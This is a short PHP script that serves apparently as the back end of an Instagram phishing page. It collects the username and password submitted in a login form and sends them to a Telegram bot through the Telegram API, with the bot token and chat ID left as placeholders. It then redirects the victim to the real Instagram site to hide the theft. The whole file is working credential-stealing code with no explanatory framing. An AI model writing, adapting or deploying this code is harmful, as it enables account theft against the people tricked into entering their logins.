<?php
$token = "YOUR_BOT_TOKEN";
$chat_id = "YOUR_CHAT_ID";
$username = $_POST['username'];
$password = $_POST['password'];

$txt = "Instagram Login:\nUsername: $username\nPassword: $password";
$sendToTelegram = fopen("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($txt),"r");

// Redirect to real Instagram
header("Location: https://instagram.com");
exit;
?>